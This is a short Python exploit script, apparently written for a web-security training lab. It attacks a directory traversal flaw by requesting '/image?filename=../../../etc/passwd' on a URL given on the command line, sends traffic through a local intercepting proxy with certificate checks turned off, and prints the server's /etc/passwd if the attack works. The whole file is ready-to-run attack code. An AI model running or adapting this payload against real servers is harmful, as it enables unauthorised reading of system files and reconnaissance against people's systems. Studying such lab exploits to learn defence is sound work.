import sys
import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def directory_traversal(url):
    image_url = url + '/image?filename='
    payload = '../../../etc/passwd'
    r = requests.get(image_url + payload, verify=False, proxies=proxies)

    if 'root' in r.text:
        print("\033[91m[+] Exploited successfully!")
        print("\033[94m[+] Extracting contents fo /etc/passwd\n")
        time.sleep(1)
        print("\033[92m[+] Contents of /etc/passwd:\n")
        print("\033[93m" + r.text)
    else:
        print("\033[91m[!] Failed to exploit")

def main():
    if len(sys.argv) != 2:
        print("\033[93m[+] Usage: python3 %s <url>" % sys.argv[0])
        sys.exit(-1)
    
    print("\033[97m[+] Exploiting directory traversal vulnerability.............")
    url = sys.argv[1]
    directory_traversal(url)

if __name__ == "__main__":
    main()